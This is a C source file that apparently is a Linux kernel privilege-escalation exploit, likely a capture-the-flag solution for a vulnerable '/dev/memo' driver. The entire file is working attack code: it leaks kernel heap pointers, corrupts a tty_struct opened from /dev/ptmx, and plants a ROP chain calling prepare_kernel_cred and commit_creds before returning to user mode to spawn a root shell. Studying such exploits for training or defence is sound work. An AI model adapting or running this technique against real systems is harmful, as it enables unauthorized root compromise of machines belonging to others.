#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <fcntl.h>


void get_shell(void) {
        char *arg[] = {"/bin/sh", NULL};
        char *env[] = {NULL};

        if(getuid() == 0) {
                printf("got dat root: %d\n", getuid());
                execve(arg[0], arg, env);
        } else {
                printf("aint got that root\n");
        }
}

unsigned long user_rip = (unsigned long)get_shell;
unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state() {
        __asm__(
                ".intel_syntax noprefix;"
                "mov user_cs, cs;"
                "mov user_ss, ss;"
                "mov user_sp, rsp;"
                "pushf;"
                "pop user_rflags;"
                ".att_syntax;"
        );
}


int main(int argc, char *argv[]) {
	long leak[128];
	long payload[36];
	long heapleak;

	int fd;
	fd = open("/dev/memo", O_RDWR);

	off_t pos = lseek(fd, 0x300, SEEK_SET);
	if(pos == -1) {
		printf("lseek error\n");
		return 1;
	}

	ssize_t bytes = read(fd, leak, sizeof(leak)-1);
	if(bytes == -1) {
		printf("read error\n");
		return 1;
	}


	for(int i=0;i<128;i++) {
		printf("leak[%d]: %lx\n", i, leak[i]);
	}
	heapleak = (long)leak[32]-0x800;
	printf("heapleak: %lx\n", heapleak);

	int ttyfd = open("/dev/ptmx", O_RDONLY);
	
	pos = lseek(fd, 0x300, SEEK_SET);
        if(pos == -1) {
                printf("lseek error\n");
                return 1;
        }

        bytes = read(fd, leak, sizeof(leak)-1);
        if(bytes == -1) {
                printf("read error\n");
                return 1;
        }


        for(int i=0;i<128;i++) {
                printf("tty_info[%d]: %lx\n", i, leak[i]);
        }

	save_state();

	//ROP chain
	leak[72] = 0x0;
	leak[73] = 0xffffffff81001268; // pop rdi; ret
	leak[74] = 0x0;
	leak[75] = 0xffffffff8107bb50; // prep_kernel
	leak[76] = 0xffffffff8104c852; // pop rcx ; ret
	leak[77] = 0x0;
	leak[78] = 0xffffffff8136b166; // mov rdi, rax ; cmp rcx, rsi ; ja 0xffffffff8136b159 ; ret
	leak[79] = 0xffffffff8107b8b0; // commit_creds	
	leak[80] = 0xffffffff81a00a2f+0x16; // swapgs
	leak[81] = 0x0;
	leak[82] = 0x0;
	leak[83] = (long)get_shell;
	leak[84] = user_cs;
	leak[85] = user_rflags;
	leak[86] = user_sp;
	leak[87] = user_ss;

	leak[12] = 0xffffffff8194d4e3;
	leak[34] = heapleak+0x300;
	leak[35] = heapleak+0x300;
	
	pos = lseek(fd, 0x300, SEEK_SET);
        if(pos == -1) {
                printf("lseek error\n");
                return 1;
        }

	bytes = write(fd, leak, sizeof(leak)-1);
	if(bytes == -1) {
		printf("write error\n");
		return 1;
	}

	pos = lseek(fd, 0x300, SEEK_SET);
        if(pos == -1) {
                printf("lseek error\n");
                return 1;
        }
	
	bytes = read(fd, leak, sizeof(leak)-1);
        if(bytes == -1) {
                printf("read error\n");
                return 1;
        }
	

        for(int i=0;i<128;i++) {
                printf("write[%d]: %lx\n", i, leak[i]);
        }
	getchar();
	ioctl(ttyfd, 0xdeadbeef, (heapleak+0x300+0x240));
	//close(ttyfd);
	//read(ttyfd, leak, 5);
	getchar();
	return 0;
}
